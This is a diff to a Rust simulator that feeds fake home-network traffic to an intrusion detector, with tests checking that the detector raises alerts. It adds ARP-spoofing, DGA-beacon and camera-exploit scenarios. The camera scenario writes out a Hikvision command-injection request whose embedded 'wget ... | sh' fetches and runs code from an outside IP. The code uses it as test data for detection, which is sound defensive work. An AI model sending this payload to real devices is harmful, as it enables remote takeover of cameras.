@@ -5,7 +5,7 @@
 //! be demonstrated without a monitor-mode capable Wi-Fi card. Once the
 //! baseline learning period has passed it replays a set of attack scenarios.
 
-use crate::model::{FrameKind, Hint, Mac, NetInfo, PacketInfo, Transport};
+use crate::model::{ArpInfo, FrameKind, Hint, Mac, NetInfo, PacketInfo, Transport};
 use chrono::{DateTime, Duration, Utc};
 use rand::rngs::StdRng;
 use rand::{Rng, SeedableRng};
@@ -48,15 +48,27 @@ enum Scenario {
     ThermostatExfil,
     DeauthFlood,
     RogueDevice,
+    /// A Raspberry Pi answers ARP for the router (man-in-the-middle).
+    ArpSpoof,
+    /// The light bridge looks up random-looking (DGA) domains.
+    DgaBeacon,
+    /// An internet host sends a Hikvision exploit to the camera's web server.
+    CameraExploit,
 }
 
-const SCENARIOS: [Scenario; 5] = [
+const SCENARIOS: [Scenario; 8] = [
+    Scenario::CameraExploit,
     Scenario::CameraUnknownHost,
     Scenario::PlugTelnetScan,
+    Scenario::ArpSpoof,
     Scenario::ThermostatExfil,
     Scenario::DeauthFlood,
+    Scenario::DgaBeacon,
     Scenario::RogueDevice,
 ];
+
+/// The simulated router's address (also its DNS resolver).
+pub const GATEWAY_IP: [u8; 4] = [192, 168, 1, 1];
 
 struct Active {
     kind: Scenario,
@@ -86,7 +98,12 @@ fn mac(s: &str) -> Mac {
 }
 
 fn t(domain: &'static str, ip: [u8; 4], port: u16) -> Target {
-    Target { domain: Some(domain), ip: Ipv4Addr::from(ip), port, udp: port == 123 }
+    Target {
+        domain: Some(domain),
+        ip: Ipv4Addr::from(ip),
+        port,
+        udp: port == 123,
+    }
 }
 
 impl Simulator {
@@ -116,7 +133,10 @@ impl Simulator {
                 ip: Ipv4Addr::new(192, 168, 1, 22),
                 rssi: -63,
                 ssid_probes: &[],
-                targets: vec![t("api.ecobee.com", [3, 215, 10, 44], 443), t("home.ecobee.com", [3, 215, 10, 45], 443)],
+                targets: vec![
+                    t("api.ecobee.com", [3, 215, 10, 44], 443),
+                    t("home.ecobee.com", [3, 215, 10, 45], 443),
+                ],
                 rate: 400.0,
                 up_ratio: 0.5,
                 pkt: 300,
@@ -242,10 +262,12 @@ impl Simulator {
             ap: mac("50:c7:bf:4e:21:01"),
             ap_rssi: -38,
             neighbor_ap: mac("a0:40:a0:77:12:9c"),
-            gw_ip: Ipv4Addr::new(192, 168, 1, 1),
+            gw_ip: Ipv4Addr::from(GATEWAY_IP),
             devices,
             resolved: HashSet::new(),
-            next_scenario: Utc::now() + Duration::minutes(learning_minutes as i64) + Duration::seconds(15),
+            next_scenario: Utc::now()
+                + Duration::minutes(learning_minutes as i64)
+                + Duration::seconds(15),
             scenario_idx: 0,
             rounds: 0,
             active: None,
@@ -259,8 +281,22 @@ impl Simulator {
     }
 
     #[allow(clippy::too_many_arguments)]
-    fn mgmt(&mut self, ts: DateTime<Utc>, subtype: &'static str, src: Mac, dst: Mac, bssid: Mac, rssi: i8, ssid: Option<&str>) -> PacketInfo {
-        let mut p = PacketInfo::new(ts, FrameKind::Management, subtype, if ssid.is_some() { 180 } else { 38 });
+    fn mgmt(
+        &mut self,
+        ts: DateTime<Utc>,
+        subtype: &'static str,
+        src: Mac,
+        dst: Mac,
+        bssid: Mac,
+        rssi: i8,
+        ssid: Option<&str>,
+    ) -> PacketInfo {
+        let mut p = PacketInfo::new(
+            ts,
+            FrameKind::Management,
+            subtype,
+            if ssid.is_some() { 180 } else { 38 },
+        );
         p.src = Some(src);
         p.dst = Some(dst);
         p.bssid = Some(bssid);
@@ -313,6 +349,12 @@ impl Simulator {
                 dns_answers: vec![],
                 sni: None,
                 hints: vec![],
+                routers: vec![],
+                router_adv: None,
+                tls: None,
+                dns_response: false,
+                dns_rcode: 0,
+                payload: vec![],
             });
         } else {
             p.src = Some(self.ap);
@@ -330,22 +372,57 @@ impl Simulator {
                 dns_answers: vec![],
                 sni: None,
                 hints: vec![],
+                routers: vec![],
+                router_adv: None,
+                tls: None,
+                dns_response: false,
+                dns_rcode: 0,
+                payload: vec![],
             });
         }
         p
     }
 
-    fn dns_pair(&mut self, ts: DateTime<Utc>, sta: Mac, rssi: i8, sta_ip: Ipv4Addr, name: &str, ip: Ipv4Addr) -> [PacketInfo; 2] {
+    fn arp(&mut self, ts: DateTime<Utc>, sender: Mac, ip: Ipv4Addr) -> PacketInfo {
+        let mut p = PacketInfo::new(ts, FrameKind::Data, "qos-data", 68);
+        p.src = Some(sender);
+        p.dst = Some(Mac::BROADCAST);
+        p.bssid = Some(self.ap);
+        p.to_ds = sender != self.ap;
+        p.from_ds = sender == self.ap;
+        p.channel = Some(CHANNEL);
+        p.rssi = Some(self.jitter(if sender == self.ap { self.ap_rssi } else { -66 }));
+        p.arp = Some(ArpInfo {
+            sender_mac: sender,
+            sender_ip: ip,
+            target_ip: ip,
+            reply: true,
+        });
+        p
+    }
+
+    fn dns_pair(
+        &mut self,
+        ts: DateTime<Utc>,
+        sta: Mac,
+        rssi: i8,
+        sta_ip: Ipv4Addr,
+        name: &str,
+        ip: Ipv4Addr,
+    ) -> [PacketInfo; 2] {
         let sport = self.rng.gen_range(40000..60000);
         let gw = self.gw_ip;
         let mut q = self.data(ts, sta, rssi, true, 90, sta_ip, gw, sport, 53, true, false);
         if let Some(n) = q.net.as_mut() {
             n.dns_query = Some(name.to_string());
         }
-        let mut r = self.data(ts, sta, rssi, false, 120, sta_ip, gw, sport, 53, true, false);
+        let mut r = self.data(
+            ts, sta, rssi, false, 120, sta_ip, gw, sport, 53, true, false,
+        );
         if let Some(n) = r.net.as_mut() {
             n.dns_query = Some(name.to_string());
             n.dns_answers = vec![(name.to_string(), IpAddr::V4(ip))];
+            n.dns_response = true;
         }
         [q, r]
     }
@@ -362,16 +439,38 @@ impl Simulator {
             out.push(self.mgmt(ts, "beacon", ap, Mac::BROADCAST, ap, rssi, Some("HomeNet")));
         }
         if self.tick_no % 10 == 3 {
-            out.push(self.mgmt(ts, "beacon", neighbor, Mac::BROADCAST, neighbor, -79, Some("NETGEAR-Guest")));
+            out.push(self.mgmt(
+                ts,
+                "beacon",
+                neighbor,
+                Mac::BROADCAST,
+                neighbor,
+                -79,
+                Some("NETGEAR-Guest"),
+            ));
+        }
+        // The router announces itself now and then (gratuitous ARP).
+        if self.tick_no % 300 == 1 {
+            let gw = self.gw_ip;
+            out.push(self.arp(ts, ap, gw));
         }
         // Passers-by with randomized MACs probing for networks.
         if self.rng.gen_bool(0.01) {
             let mut m = [0u8; 6];
             self.rng.fill(&mut m);
             m[0] = (m[0] | 0x02) & 0xfe;
-            let ssid = ["xfinitywifi", "attwifi", "Pixel_4821", "DIRECT-roku-112"][self.rng.gen_range(0..4)];
+            let ssid = ["xfinitywifi", "attwifi", "Pixel_4821", "DIRECT-roku-112"]
+                [self.rng.gen_range(0..4)];
             let rssi = self.rng.gen_range(-90..-75);
-            out.push(self.mgmt(ts, "probe-req", Mac(m), Mac::BROADCAST, Mac::BROADCAST, rssi, Some(ssid)));
+            out.push(self.mgmt(
+                ts,
+                "probe-req",
+                Mac(m),
+                Mac::BROADCAST,
+                Mac::BROADCAST,
+                rssi,
+                Some(ssid),
+            ));
         }
 
         let mut devices = std::mem::take(&mut self.devices);
@@ -392,7 +491,19 @@ impl Simulator {
                     hints.push(Hint::VendorClass(vc.into()));
                 }
                 if !hints.is_empty() {
-                    let mut p = self.data(ts, d.mac, d.rssi, true, 342, Ipv4Addr::UNSPECIFIED, Ipv4Addr::BROADCAST, 68, 67, true, false);
+                    let mut p = self.data(
+                        ts,
+                        d.mac,
+                        d.rssi,
+                        true,
+                        342,
+                        Ipv4Addr::UNSPECIFIED,
+                        Ipv4Addr::BROADCAST,
+                        68,
+                        67,
+                        true,
+                        false,
+                    );
                     p.dst = Some(Mac::BROADCAST);
                     if let Some(n) = p.net.as_mut() {
                         n.hints = hints;
@@ -402,13 +513,23 @@ impl Simulator {
             }
             if (!d.services.is_empty() || d.server.is_some()) && self.rng.gen_bool(0.003) {
                 let (dst_ip, port, hints) = if let Some(srv) = d.server {
-                    (Ipv4Addr::new(239, 255, 255, 250), 1900, vec![Hint::Server(srv.into())])
+                    (
+                        Ipv4Addr::new(239, 255, 255, 250),
+                        1900,
+                        vec![Hint::Server(srv.into())],
+                    )
                 } else {
-                    let mut h: Vec<Hint> = d.services.iter().map(|s| Hint::Service((*s).into())).collect();
+                    let mut h: Vec<Hint> = d
+                        .services
+                        .iter()
+                        .map(|s| Hint::Service((*s).into()))
+                        .collect();
                     h.push(Hint::Hostname(d.hostname.into()));
                     (Ipv4Addr::new(224, 0, 0, 251), 5353, h)
                 };
-                let mut p = self.data(ts, d.mac, d.rssi, true, 300, d.ip, dst_ip, port, port, true, false);
+                let mut p = self.data(
+                    ts, d.mac, d.rssi, true, 300, d.ip, dst_ip, port, port, true, false,
+                );
                 p.dst = Some(Mac([0x01, 0x00, 0x5e, 0x7f, 0xff, 0xfa]));
                 if let Some(n) = p.net.as_mut() {
                     n.hints = hints;
@@ -417,7 +538,15 @@ impl Simulator {
             }
             if !d.ssid_probes.is_empty() && self.rng.gen_bool(0.004) {
                 let s = d.ssid_probes[self.rng.gen_range(0..d.ssid_probes.len())];
-                out.push(self.mgmt(ts, "probe-req", d.mac, Mac::BROADCAST, Mac::BROADCAST, d.rssi, Some(s)));
+                out.push(self.mgmt(
+                    ts,
+                    "probe-req",
+                    d.mac,
+                    Mac::BROADCAST,
+                    Mac::BROADCAST,
+                    d.rssi,
+                    Some(s),
+                ));
             }
             // Power-save null frames
             if self.rng.gen_bool(0.02) {
@@ -452,7 +581,19 @@ impl Simulator {
                 let up = self.rng.gen_bool(d.up_ratio);
                 let len = self.rng.gen_range(d.pkt / 3..=d.pkt);
                 let sport = 40000 + (ti as u16) * 7 + (i as u16) * 101;
-                out.push(self.data(ts, d.mac, d.rssi, up || syn, len, d.ip, rip, sport, port, udp, syn));
+                out.push(self.data(
+                    ts,
+                    d.mac,
+                    d.rssi,
+                    up || syn,
+                    len,
+                    d.ip,
+                    rip,
+                    sport,
+                    port,
+                    udp,
+                    syn,
+                ));
                 if self.rng.gen_bool(0.5) {
                     let to = if up { d.mac } else { ap };
                     out.push(self.ack(ts, to, d.rssi));
@@ -478,8 +619,16 @@ impl Simulator {
                 Scenario::ThermostatExfil => 80,
                 Scenario::DeauthFlood => 30,
                 Scenario::RogueDevice => 1,
+                Scenario::ArpSpoof => 20,
+                Scenario::DgaBeacon => 10,
+                Scenario::CameraExploit => 4,
             };
-            self.active = Some(Active { kind, tick: 0, ticks, salt: self.rounds });
+            self.active = Some(Active {
+                kind,
+                tick: 0,
+                ticks,
+                salt: self.rounds,
+            });
             self.next_scenario = ts + Duration::seconds(self.rng.gen_range(35..55));
         }
         if let Some(mut a) = self.active.take() {
@@ -495,7 +644,11 @@ impl Simulator {
     fn run_scenario(&mut self, ts: DateTime<Utc>, a: &mut Active, out: &mut Vec<PacketInfo>) {
         match a.kind {
             Scenario::CameraUnknownHost => {
-                let (m, r, ip) = (self.devices[0].mac, self.devices[0].rssi, self.devices[0].ip);
+                let (m, r, ip) = (
+                    self.devices[0].mac,
+                    self.devices[0].rssi,
+                    self.devices[0].ip,
+                );
                 let rip = Ipv4Addr::new(185, 220, 101, 47u8.wrapping_add(a.salt));
                 for k in 0..2 {
                     let syn = a.tick == 0 && k == 0;
@@ -503,22 +656,47 @@ impl Simulator {
                 }
             }
             Scenario::PlugTelnetScan => {
-                let (m, r, ip) = (self.devices[4].mac, self.devices[4].rssi, self.devices[4].ip);
+                let (m, r, ip) = (
+                    self.devices[4].mac,
+                    self.devices[4].rssi,
+                    self.devices[4].ip,
+                );
                 for _ in 0..4 {
-                    let rip = Ipv4Addr::new(self.rng.gen_range(60..220), self.rng.gen(), self.rng.gen(), self.rng.gen_range(1..254));
+                    let rip = Ipv4Addr::new(
+                        self.rng.gen_range(60..220),
+                        self.rng.gen(),
+                        self.rng.gen(),
+                        self.rng.gen_range(1..254),
+                    );
                     let port = if self.rng.gen_bool(0.7) { 23 } else { 2323 };
                     let sport = self.rng.gen_range(30000..60000);
                     out.push(self.data(ts, m, r, true, 60, ip, rip, sport, port, false, true));
                 }
             }
             Scenario::ThermostatExfil => {
-                let (m, r, ip) = (self.devices[1].mac, self.devices[1].rssi, self.devices[1].ip);
+                let (m, r, ip) = (
+                    self.devices[1].mac,
+                    self.devices[1].rssi,
+                    self.devices[1].ip,
+                );
                 let rip = Ipv4Addr::new(45, 153, 160, 2u8.wrapping_add(a.salt));
                 if a.tick == 0 {
                     out.extend(self.dns_pair(ts, m, r, ip, "upload.storage-sync.xyz", rip));
                 }
                 for k in 0..55 {
-                    out.push(self.data(ts, m, r, true, 1460, ip, rip, 52020, 443, false, a.tick == 0 && k == 0));
+                    out.push(self.data(
+                        ts,
+                        m,
+                        r,
+                        true,
+                        1460,
+                        ip,
+                        rip,
+                        52020,
+                        443,
+                        false,
+                        a.tick == 0 && k == 0,
+                    ));
                 }
             }
             Scenario::DeauthFlood => {
@@ -527,6 +705,63 @@ impl Simulator {
                     out.push(self.mgmt(ts, "deauth", ap, Mac::BROADCAST, ap, -71, None));
                 }
             }
+            Scenario::ArpSpoof => {
+                if a.tick.is_multiple_of(4) {
+                    let pi = Mac([0xdc, 0xa6, 0x32, 0x5e, 0x10, 0x07u8.wrapping_add(a.salt)]);
+                    let gw = self.gw_ip;
+                    out.push(self.arp(ts, pi, gw));
+                }
+            }
+            Scenario::CameraExploit => {
+                let (m, r, ip) = (
+                    self.devices[0].mac,
+                    self.devices[0].rssi,
+                    self.devices[0].ip,
+                );
+                let attacker = Ipv4Addr::new(45, 95, 147, 236);
+                // Request in, the camera's web server answers.
+                let mut req =
+                    self.data(ts, m, r, false, 380, ip, attacker, 80, 47123, false, false);
+                if let Some(n) = req.net.as_mut() {
+                    n.payload = b"PUT /SDK/webLanguage HTTP/1.1\r\nHost: 192.168.1.21\r\nContent-Type: application/xml\r\n\r\n<language>$(wget http://45.95.147.236/x -O-|sh)</language>".to_vec();
+                }
+                out.push(req);
+                let mut resp =
+                    self.data(ts, m, r, true, 240, ip, attacker, 80, 47123, false, false);
+                if let Some(n) = resp.net.as_mut() {
+                    n.payload = b"HTTP/1.1 500 Internal Server Error\r\n\r\n".to_vec();
+                }
+                out.push(resp);
+                // Telnet left enabled answering the same attacker.
+                let mut tel = self.data(ts, m, r, true, 90, ip, attacker, 23, 51234, false, false);
+                if let Some(n) = tel.net.as_mut() {
+                    n.payload = b"\r\nlogin: ".to_vec();
+                }
+                out.push(tel);
+            }
+            Scenario::DgaBeacon => {
+                let (m, r, ip) = (
+                    self.devices[2].mac,
+                    self.devices[2].rssi,
+                    self.devices[2].ip,
+                );
+                let name: String = (0..13)
+                    .map(|_| {
+                        let c = self.rng.gen_range(0..36u8);
+                        (if c < 26 { b'a' + c } else { b'0' + c - 26 }) as char
+                    })
+                    .collect();
+                let tld = ["net", "info", "top", "xyz"][self.rng.gen_range(0..4)];
+                let [q, _] = self.dns_pair(
+                    ts,
+                    m,
+                    r,
+                    ip,
+                    &format!("{name}.{tld}"),
+                    Ipv4Addr::UNSPECIFIED,
+                );
+                out.push(q); // NXDOMAIN: the C2 domain for today isn't registered
+            }
             Scenario::RogueDevice => {
                 let salt = a.salt;
                 self.rogue = Some(SimDevice {
@@ -534,7 +769,12 @@ impl Simulator {
                     ip: Ipv4Addr::new(192, 168, 1, 77u8.wrapping_add(salt)),
                     rssi: -70,
                     ssid_probes: &[],
-                    targets: vec![Target { domain: None, ip: Ipv4Addr::new(203, 0, 113, 50), port: 1883, udp: false }],
+                    targets: vec![Target {
+                        domain: None,
+                        ip: Ipv4Addr::new(203, 0, 113, 50),
+                        port: 1883,
+                        udp: false,
+                    }],
                     rate: 150.0,
                     up_ratio: 0.6,
                     pkt: 200,
@@ -569,12 +809,20 @@ mod tests {
         use crate::settings::RuleSettings;
         use std::collections::BTreeSet;
 
-        let rules = RuleSettings { learning_minutes: 1, ..Default::default() };
+        let rules = RuleSettings {
+            learning_minutes: 1,
+            ..Default::default()
+        };
         let mut eng = Engine::new(rules, OuiDb::load(None));
+        eng.gateway_ip = Some(IpAddr::V4(GATEWAY_IP.into()));
+        let mut set = crate::ids::RuleSet::default();
+        set.add_text("built-in", crate::ids::BUILTIN);
+        set.build();
+        eng.ids = std::sync::Arc::new(set);
         let mut sim = Simulator::new(1);
         let t0 = Utc::now();
         eng.begin_session(Some(t0));
-        for i in 0..(10 * 60 * 5) {
+        for i in 0..(10 * 60 * 7) {
             let ts = t0 + Duration::milliseconds(i * 100);
             for p in sim.step(ts) {
                 eng.process(&p);
@@ -584,20 +832,63 @@ mod tests {
             }
         }
         for a in &eng.alerts {
-            eprintln!("{:?} {:<17} {} | {}", a.severity, a.rule, a.title, a.message);
+            eprintln!(
+                "{:?} {:<17} {} | {}",
+                a.severity, a.rule, a.title, a.message
+            );
         }
         let rules: BTreeSet<&str> = eng.alerts.iter().map(|a| a.rule.as_str()).collect();
-        for expected in ["new-destination", "unexpected-port", "risky-port", "connection-burst", "volume-spike", "deauth-flood", "new-device"] {
-            assert!(rules.contains(expected), "missing {expected}; got {rules:?}");
+        for expected in [
+            "new-destination",
+            "unexpected-port",
+            "risky-port",
+            "connection-burst",
+            "volume-spike",
+            "deauth-flood",
+            "new-device",
+            "arp-spoof",
+            "suspicious-domain",
+            "ids-signature",
+        ] {
+            assert!(
+                rules.contains(expected),
+                "missing {expected}; got {rules:?}"
+            );
         }
         // Quiet devices must not produce noise.
         let cam: Mac = "44:19:b6:3a:7c:10".parse().unwrap();
         assert_eq!(eng.devices[&cam].auto_class, "Smart Camera");
         let laptop: Mac = "a4:34:d9:10:aa:5b".parse().unwrap();
-        assert!(!eng.alerts.iter().any(|a| a.device == Some(laptop)), "laptop should be quiet");
+        assert!(
+            !eng.alerts.iter().any(|a| a.device == Some(laptop)),
+            "laptop should be quiet"
+        );
         let ap: Mac = "50:c7:bf:4e:21:01".parse().unwrap();
-        assert!(!eng.alerts.iter().any(|a| a.device == Some(ap) && a.rule == "volume-spike"), "AP must not echo spikes");
-        assert_eq!(eng.devices[&laptop].hostname.as_deref(), Some("Student-Laptop"));
+        assert!(
+            !eng.alerts
+                .iter()
+                .any(|a| a.device == Some(ap) && a.rule == "volume-spike"),
+            "AP must not echo spikes"
+        );
+        let findings = crate::exposure::assess(&eng.devices[&cam], &eng.kev);
+        assert!(
+            findings.iter().any(|f| f.id == "telnet-server")
+                && findings.iter().any(|f| f.id == "http-admin"),
+            "{findings:?}"
+        );
+        let (_, dns) = eng.drain_records();
+        assert!(!dns.is_empty(), "DNS log populated");
+        let gateways: Vec<Mac> = eng
+            .devices
+            .values()
+            .filter(|d| d.is_gateway)
+            .map(|d| d.mac)
+            .collect();
+        assert_eq!(gateways, vec![ap], "only the router is a gateway");
+        assert_eq!(
+            eng.devices[&laptop].hostname.as_deref(),
+            Some("Student-Laptop")
+        );
         assert_eq!(eng.devices[&laptop].auto_class, "Laptop / PC");
     }
 }
